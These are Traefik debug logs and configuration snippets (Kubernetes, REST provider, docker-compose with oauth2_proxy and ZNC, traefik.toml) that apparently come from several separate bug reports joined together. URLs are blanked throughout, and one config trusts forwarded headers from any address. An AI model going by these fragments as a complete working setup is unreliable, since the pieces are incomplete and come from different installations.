time="2019-03-01t13:57:16z" level=debug msg="adding tlsclientheaders middleware for frontend /promo"
time="2019-03-01t13:57:16z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:16z" level=debug msg="creating server promo-api-service-7d5968c556-rrfk2 at with weight 1"
time="2019-03-01t13:57:16z" level=debug msg="creating route /promo pathprefix:/promo"
time="2019-03-01t13:57:16z" level=debug msg="wiring frontend /anotherservice to entrypoint http"
time="2019-03-01t13:57:16z" level=debug msg="creating backend /anotherservice"
time="2019-03-01t13:57:16z" level=debug msg="adding tlsclientheaders middleware for frontend /anotherservice"
time="2019-03-01t13:57:16z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:16z" level=debug msg="creating server anotherservice-7856788888-dwnjc at with weight 1"
time="2019-03-01t13:57:16z" level=debug msg="creating server anotherservice-7856788888-kczj5 at with weight 1"
time="2019-03-01t13:57:16z" level=debug msg="creating server anotherservice-7856788888-sxtzt at with weight 1"
time="2019-03-01t13:57:16z" level=debug msg="creating route /anotherservice pathprefixstrip:/anotherservice"
time="2019-03-01t13:57:16z" level=debug msg="wiring frontend /sockjs-node to entrypoint http"
time="2019-03-01t13:57:16z" level=debug msg="creating backend /sockjs-node"
time="2019-03-01t13:57:16z" level=debug msg="adding tlsclientheaders middleware for frontend /sockjs-node"
time="2019-03-01t13:57:16z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:16z" level=debug msg="creating server myservice-5c55585b8-cxprc at with weight 1"
time="2019-03-01t13:57:16z" level=debug msg="creating route /sockjs-node pathprefix:/sockjs-node"
time="2019-03-01t13:57:16z" level=debug msg="wiring frontend /static to entrypoint http"
time="2019-03-01t13:57:16z" level=debug msg="creating backend /static"
time="2019-03-01t13:57:16z" level=debug msg="adding tlsclientheaders middleware for frontend /static"
time="2019-03-01t13:57:16z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:16z" level=debug msg="creating server myservice-5c55585b8-cxprc at with weight 1"
time="2019-03-01t13:57:16z" level=debug msg="creating route /static pathprefix:/static"
time="2019-03-01t13:57:16z" level=debug msg="wiring frontend /traefik to entrypoint http"
time="2019-03-01t13:57:16z" level=debug msg="creating backend /traefik"
time="2019-03-01t13:57:16z" level=debug msg="adding tlsclientheaders middleware for frontend /traefik"
time="2019-03-01t13:57:16z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:16z" level=debug msg="creating server traefik-ingress-controller-5945dd5fbf-hkt6p at with weight 1"
time="2019-03-01t13:57:16z" level=debug msg="creating route /traefik pathprefixstrip:/traefik"
time="2019-03-01t13:57:16z" level=info msg="server configuration reloaded on :8080"
time="2019-03-01t13:57:16z" level=info msg="server configuration reloaded on :80"
time="2019-03-01t13:57:16z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:17z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="configuration received from provider kubernetes: {\\"backends\\":{\\"/fe\\":{\\"servers\\":{\\"myservice-5c55585b8-cxprc\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/promo\\":{\\"servers\\":{\\"promo-api-service-7d5968c556-rrfk2\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/anotherservice\\":{\\"servers\\":{\\"anotherservice-7856788888-dwnjc\\":{\\"url\\":\\" ",\\"weight\\":1},\\"anotherservice-7856788888-kczj5\\":{\\"url\\":\\" ",\\"weight\\":1},\\"anotherservice-7856788888-sxtzt\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/sockjs-node\\":{\\"servers\\":{\\"myservice-5c55585b8-cxprc\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/static\\":{\\"servers\\":{\\"myservice-5c55585b8-cxprc\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/traefik\\":{\\"servers\\":{\\"traefik-ingress-controller-5945dd5fbf-hkt6p\\":{\\"url\\":\\" ",\\"weight\\":1},\\"traefik-ingress-controller-5945dd5fbf-xd5b6\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"/fe\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/fe\\",\\"routes\\":{\\"/fe\\":{\\"rule\\":\\"pathprefixstrip:/fe\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null,\\"whitelist\\":{\\"sourcerange\\":[\\"<whitelisted-ip-subnet>/24\\",\\"<whitelisted-ip-subnet>/24\\"],\\"usexforwardedfor\\":true}},\\"/promo\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/promo\\",\\"routes\\":{\\"/promo\\":{\\"rule\\":\\"pathprefix:/promo\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/anotherservice\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/anotherservice\\",\\"routes\\":{\\"/anotherservice\\":{\\"rule\\":\\"pathprefixstrip:/anotherservice\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/sockjs-node\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/sockjs-node\\",\\"routes\\":{\\"/sockjs-node\\":{\\"rule\\":\\"pathprefix:/sockjs-node\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/static\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/static\\",\\"routes\\":{\\"/static\\":{\\"rule\\":\\"pathprefix:/static\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/traefik\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/traefik\\",\\"routes\\":{\\"/traefik\\":{\\"rule\\":\\"pathprefixstrip:/traefik\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:17z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:17z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:17z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:18z" level=debug msg="wiring frontend /fe to entrypoint http"
time="2019-03-01t13:57:18z" level=debug msg="creating backend /fe"
time="2019-03-01t13:57:18z" level=debug msg="configured ip white list: [<whitelisted-ip-subnet>/24 <whitelisted-ip-subnet>/24]"
time="2019-03-01t13:57:18z" level=debug msg="configured ip whitelists: [<whitelisted-ip-subnet>/24 <whitelisted-ip-subnet>/24]"
time="2019-03-01t13:57:18z" level=debug msg="adding tlsclientheaders middleware for frontend /fe"
time="2019-03-01t13:57:18z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:18z" level=debug msg="creating server myservice-5c55585b8-cxprc at with weight 1"
time="2019-03-01t13:57:18z" level=debug msg="creating route /fe pathprefixstrip:/fe"
time="2019-03-01t13:57:18z" level=debug msg="wiring frontend /promo to entrypoint http"
time="2019-03-01t13:57:18z" level=debug msg="creating backend /promo"
time="2019-03-01t13:57:18z" level=debug msg="adding tlsclientheaders middleware for frontend /promo"
time="2019-03-01t13:57:18z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:18z" level=debug msg="creating server promo-api-service-7d5968c556-rrfk2 at with weight 1"
time="2019-03-01t13:57:18z" level=debug msg="creating route /promo pathprefix:/promo"
time="2019-03-01t13:57:18z" level=debug msg="wiring frontend /anotherservice to entrypoint http"
time="2019-03-01t13:57:18z" level=debug msg="creating backend /anotherservice"
time="2019-03-01t13:57:18z" level=debug msg="adding tlsclientheaders middleware for frontend /anotherservice"
time="2019-03-01t13:57:18z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:18z" level=debug msg="creating server anotherservice-7856788888-kczj5 at with weight 1"
time="2019-03-01t13:57:18z" level=debug msg="creating server anotherservice-7856788888-sxtzt at with weight 1"
time="2019-03-01t13:57:18z" level=debug msg="creating server anotherservice-7856788888-dwnjc at with weight 1"
time="2019-03-01t13:57:18z" level=debug msg="creating route /anotherservice pathprefixstrip:/anotherservice"
time="2019-03-01t13:57:18z" level=debug msg="wiring frontend /sockjs-node to entrypoint http"
time="2019-03-01t13:57:18z" level=debug msg="creating backend /sockjs-node"
time="2019-03-01t13:57:18z" level=debug msg="adding tlsclientheaders middleware for frontend /sockjs-node"
time="2019-03-01t13:57:18z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:18z" level=debug msg="creating server myservice-5c55585b8-cxprc at with weight 1"
time="2019-03-01t13:57:18z" level=debug msg="creating route /sockjs-node pathprefix:/sockjs-node"
time="2019-03-01t13:57:18z" level=debug msg="wiring frontend /static to entrypoint http"
time="2019-03-01t13:57:18z" level=debug msg="creating backend /static"
time="2019-03-01t13:57:18z" level=debug msg="adding tlsclientheaders middleware for frontend /static"
time="2019-03-01t13:57:18z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:18z" level=debug msg="creating server myservice-5c55585b8-cxprc at with weight 1"
time="2019-03-01t13:57:18z" level=debug msg="creating route /static pathprefix:/static"
time="2019-03-01t13:57:18z" level=debug msg="wiring frontend /traefik to entrypoint http"
time="2019-03-01t13:57:18z" level=debug msg="creating backend /traefik"
time="2019-03-01t13:57:18z" level=debug msg="adding tlsclientheaders middleware for frontend /traefik"
time="2019-03-01t13:57:18z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:18z" level=debug msg="creating server traefik-ingress-controller-5945dd5fbf-hkt6p at with weight 1"
time="2019-03-01t13:57:18z" level=debug msg="creating server traefik-ingress-controller-5945dd5fbf-xd5b6 at with weight 1"
time="2019-03-01t13:57:18z" level=debug msg="creating route /traefik pathprefixstrip:/traefik"
time="2019-03-01t13:57:18z" level=info msg="server configuration reloaded on :80"
time="2019-03-01t13:57:18z" level=info msg="server configuration reloaded on :8080"
time="2019-03-01t13:57:18z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:18z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:18z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:18z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:18z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:18z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:18z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:19z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:19z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="configuration received from provider kubernetes: {\\"backends\\":{\\"/fe\\":{\\"servers\\":{\\"myservice-5c55585b8-cxprc\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/promo\\":{\\"servers\\":{\\"promo-api-service-7d5968c556-rrfk2\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/anotherservice\\":{\\"servers\\":{\\"anotherservice-7856788888-dwnjc\\":{\\"url\\":\\" ",\\"weight\\":1},\\"anotherservice-7856788888-kczj5\\":{\\"url\\":\\" ",\\"weight\\":1},\\"anotherservice-7856788888-sxtzt\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/sockjs-node\\":{\\"servers\\":{\\"myservice-5c55585b8-cxprc\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/static\\":{\\"servers\\":{\\"myservice-5c55585b8-cxprc\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/traefik\\":{\\"servers\\":{\\"traefik-ingress-controller-5945dd5fbf-69jkg\\":{\\"url\\":\\" ",\\"weight\\":1},\\"traefik-ingress-controller-5945dd5fbf-hkt6p\\":{\\"url\\":\\" ",\\"weight\\":1},\\"traefik-ingress-controller-5945dd5fbf-xd5b6\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"/fe\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/fe\\",\\"routes\\":{\\"/fe\\":{\\"rule\\":\\"pathprefixstrip:/fe\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null,\\"whitelist\\":{\\"sourcerange\\":[\\"<whitelisted-ip-subnet>/24\\",\\"<whitelisted-ip-subnet>/24\\"],\\"usexforwardedfor\\":true}},\\"/promo\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/promo\\",\\"routes\\":{\\"/promo\\":{\\"rule\\":\\"pathprefix:/promo\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/anotherservice\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/anotherservice\\",\\"routes\\":{\\"/anotherservice\\":{\\"rule\\":\\"pathprefixstrip:/anotherservice\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/sockjs-node\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/sockjs-node\\",\\"routes\\":{\\"/sockjs-node\\":{\\"rule\\":\\"pathprefix:/sockjs-node\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/static\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/static\\",\\"routes\\":{\\"/static\\":{\\"rule\\":\\"pathprefix:/static\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/traefik\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/traefik\\",\\"routes\\":{\\"/traefik\\":{\\"rule\\":\\"pathprefixstrip:/traefik\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}"
time="2019-03-01t13:57:19z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:19z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:19z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:20z" level=debug msg="wiring frontend /fe to entrypoint http"
time="2019-03-01t13:57:20z" level=debug msg="creating backend /fe"
time="2019-03-01t13:57:20z" level=debug msg="configured ip white list: [<whitelisted-ip-subnet>/24 <whitelisted-ip-subnet>/24]"
time="2019-03-01t13:57:20z" level=debug msg="configured ip whitelists: [<whitelisted-ip-subnet>/24 <whitelisted-ip-subnet>/24]"
time="2019-03-01t13:57:20z" level=debug msg="adding tlsclientheaders middleware for frontend /fe"
time="2019-03-01t13:57:20z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:20z" level=debug msg="creating server myservice-5c55585b8-cxprc at with weight 1"
time="2019-03-01t13:57:20z" level=debug msg="creating route /fe pathprefixstrip:/fe"
time="2019-03-01t13:57:20z" level=debug msg="wiring frontend /promo to entrypoint http"
time="2019-03-01t13:57:20z" level=debug msg="creating backend /promo"
time="2019-03-01t13:57:20z" level=debug msg="adding tlsclientheaders middleware for frontend /promo"
time="2019-03-01t13:57:20z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:20z" level=debug msg="creating server promo-api-service-7d5968c556-rrfk2 at with weight 1"
time="2019-03-01t13:57:20z" level=debug msg="creating route /promo pathprefix:/promo"
time="2019-03-01t13:57:20z" level=debug msg="wiring frontend /anotherservice to entrypoint http"
time="2019-03-01t13:57:20z" level=debug msg="creating backend /anotherservice"
time="2019-03-01t13:57:20z" level=debug msg="adding tlsclientheaders middleware for frontend /anotherservice"
time="2019-03-01t13:57:20z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:20z" level=debug msg="creating server anotherservice-7856788888-dwnjc at with weight 1"
time="2019-03-01t13:57:20z" level=debug msg="creating server anotherservice-7856788888-kczj5 at with weight 1"
time="2019-03-01t13:57:20z" level=debug msg="creating server anotherservice-7856788888-sxtzt at with weight 1"
time="2019-03-01t13:57:20z" level=debug msg="creating route /anotherservice pathprefixstrip:/anotherservice"
time="2019-03-01t13:57:20z" level=debug msg="wiring frontend /sockjs-node to entrypoint http"
time="2019-03-01t13:57:20z" level=debug msg="creating backend /sockjs-node"
time="2019-03-01t13:57:20z" level=debug msg="adding tlsclientheaders middleware for frontend /sockjs-node"
time="2019-03-01t13:57:20z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:20z" level=debug msg="creating server myservice-5c55585b8-cxprc at with weight 1"
time="2019-03-01t13:57:20z" level=debug msg="creating route /sockjs-node pathprefix:/sockjs-node"
time="2019-03-01t13:57:20z" level=debug msg="wiring frontend /static to entrypoint http"
time="2019-03-01t13:57:20z" level=debug msg="creating backend /static"
time="2019-03-01t13:57:20z" level=debug msg="adding tlsclientheaders middleware for frontend /static"
time="2019-03-01t13:57:20z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:20z" level=debug msg="creating server myservice-5c55585b8-cxprc at with weight 1"
time="2019-03-01t13:57:20z" level=debug msg="creating route /static pathprefix:/static"
time="2019-03-01t13:57:20z" level=debug msg="wiring frontend /traefik to entrypoint http"
time="2019-03-01t13:57:20z" level=debug msg="creating backend /traefik"
time="2019-03-01t13:57:20z" level=debug msg="adding tlsclientheaders middleware for frontend /traefik"
time="2019-03-01t13:57:20z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:20z" level=debug msg="creating server traefik-ingress-controller-5945dd5fbf-xd5b6 at with weight 1"
time="2019-03-01t13:57:20z" level=debug msg="creating server traefik-ingress-controller-5945dd5fbf-69jkg at with weight 1"
time="2019-03-01t13:57:20z" level=debug msg="creating server traefik-ingress-controller-5945dd5fbf-hkt6p at with weight 1"
time="2019-03-01t13:57:20z" level=debug msg="creating route /traefik pathprefixstrip:/traefik"
time="2019-03-01t13:57:20z" level=info msg="server configuration reloaded on :80"
time="2019-03-01t13:57:20z" level=info msg="server configuration reloaded on :8080"
kubernetes provider ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ``` ```
defaultentrypoints = ["http"]
loglevel = "info"
[traefiklog] filepath = "/var/log/traefiklogs/traefik.log" [entrypoints] [entrypoints.http] address = ":80" compress = false
[file] watch = true [backends] [frontends]
``` after startup i create a rest provider by doing a put request to :8091/api/providers/rest with the rest request mentioned ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) the rest response does not contain timeout parameter ```
{ "backends": { "myback": { "servers": { "s0": { "url": " ", "weight": 100 } }, "loadbalancer": { "method": "wrr", "stickiness": { "cookiename": "backend" } }, "healthcheck": { "path": "/healthcheck", "interval": "11s" } } }, "frontends": { "myfront": { "entrypoints": [ "http" ], "backend": "myback", "passhostheader": true, "priority": 999, "basicauth": null, "headers": {} } }
version: \'3.7\' networks: backend: {} services: oauth2: command: # - -client-id # environment # - -client-secret # environment # - -cookie-secret # environment - "-cookie-secure=false" - "-email-domain=*" - "-github-org=dispenserinc" - "-provider=github" - "-redirect-url= {domain}/oauth2/callback" - "-set-xauthrequest" - "-set-authorization-header" - "-http-address=0.0.0.0:4180" environment: - "oauth2_proxy_client_id=${github_oauth_client_id}" - "oauth2_proxy_client_secret=${github_oauth_client_secret}" - "oauth2_proxy_cookie_secret=${oauth2_proxy_cookie_secret}" expose: - "4180" image: quay.io/pusher/oauth2_proxy:v3.1.0 labels: - "traefik.frontend.rule=host:login.${domain},${domain},pathprefix=/oauth2" networks: - backend restart: unless-stopped traefik: command: - --accesslog - --api # defaults to port 8080 - --docker - --docker.network=backend - --defaultentrypoints=http # - --debug image: traefik:maroilles-alpine labels: - "traefik.api.port=8080" - "traefik.api.fronted.entrypoints=traefik" - "traefik.api.frontend.rule=pathprefixstrip:/traefik" - "traefik.api.frontend.auth.forward.address= {domain}/oauth2/auth" - "traefik.api.frontend.auth.forward.authresponseheaders=x-auth-request-user,x-auth-request-email,set-cookie" - "traefik.api.frontend.auth.forward.headerfield=x-auth-request-user" - "traefik.api.frontend.errors.401.backend=oauth2-home" - "traefik.api.frontend.errors.401.status=401" - "traefik.api.frontend.errors.401.query=/oauth2/sign_in" networks: - backend - default ports: - "80:80" # the http port - "443:443" # the https port - "8080:8080" # the web ui (enabled by --api) restart: unless-stopped # user: cannot run as user to bind privileged ports volumes: - "/var/run/docker.sock:/var/run/docker.sock:ro" # so that traefik can listen to the docker events znc: container_name: znc image: znc:1.7 labels: # requires uriprefix = /znc/ - "traefik.frontend.rule=pathprefix:/znc" expose: - "6501" networks: - backend restart: unless-stopped user: "${uid}:${gid}" volumes: - "${mount}/.znc:/znc-data"
``` here a few request examples:
# example of a request from lan
traefik_1 | 10.0.0.150 - - [18/feb/2019:21:59:37 +0000] "get / http/1.1" 404 19 "-" "mozilla/5.0 (macintosh; intel mac os x 10_12_6) applewebkit/537.36 (khtml, like gecko) chrome/73.0.3683.20 safari/537.36" 2 "backend not found" "/" 0ms # example of an expected redirect to oauth request from the lan (
traefik_1 | 10.0.0.150 - - [18/feb/2019:21:44:50 +0000] "get /traefik http/1.1" 200 2471 "-" "mozilla/5.0 (macintosh; intel mac os x 10_12_6) applewebkit/537.36 (khtml, like gecko) chrome/73.0.3683.20 safari/537.36" 2 "host-login-alioth-ovh-alioth-ovh-pathprefix-oauth2-4" " " 51ms # successfully reaching /znc path
traefik_1 | 10.0.0.150 - - [18/feb/2019:22:00:52 +0000] "get /znc http/1.1" 302 380 "-" "mozilla/5.0 (macintosh; intel mac os x 10_12_6) applewebkit/537.36 (khtml, like gecko) chrome/73.0.3683.20 safari/537.36" 5 "pathprefix-znc-5" " " 3ms
traefik_1 | 10.0.0.150 - - [18/feb/2019:22:00:52 +0000] "get /znc/ http/1.1" 200 4123 "-" "mozilla/5.0 (macintosh; intel mac os x 10_12_6) applewebkit/537.36 (khtml, like gecko) chrome/73.0.3683.20 safari/537.36" 6 "pathprefix-znc-5" " " 11ms # 403 when trying domain/znc - the 10.0.0.1 is because of hairpin nat on my router, the same happens with an external ip
traefik_1 | 10.0.0.1 - - [18/feb/2019:22:01:34 +0000] "get /znc http/1.1" 403 2474 "-" "mozilla/5.0 (macintosh; intel mac os x 10_12_6) applewebkit/537.36 (khtml, like gecko) chrome/73.0.3683.20 safari/537.36" 7 "host-login-alioth-ovh-alioth-ovh-pathprefix-oauth2-4" " " 2ms
traefik_1 | 91.253.146.166 - - [18/feb/2019:21:51:01 +0000] "get /znc http/1.1" 403 2474 "-" "mozilla/5.0 (android 8.0.0; mobile; rv:65.0) gecko/65.0 firefox/65.0" 9 "host-login-alioth-ovh-alioth-ovh-pathprefix-oauth2-4" " " 2ms
# traefik.toml
loglevel = "info"
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.forwardedheaders] trustedips = ["0.0.0.0/0"] [entrypoints.http.redirect] regex = "^ " replacement = " " permanent = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.forwardedheaders] trustedips = ["0.0.0.0/0"] [entrypoints.https.tls] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_aes_256_cbc_sha" ] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key"
[kubernetes]
ingressclass = "dogfood-traefik" [kubernetes.ingressendpoint] publishedservice = "dogfood/dogfood-traefik"
[traefiklog] format = "json"
[accesslog] format = "json"
[accesslog.fields] defaultmode = "keep"
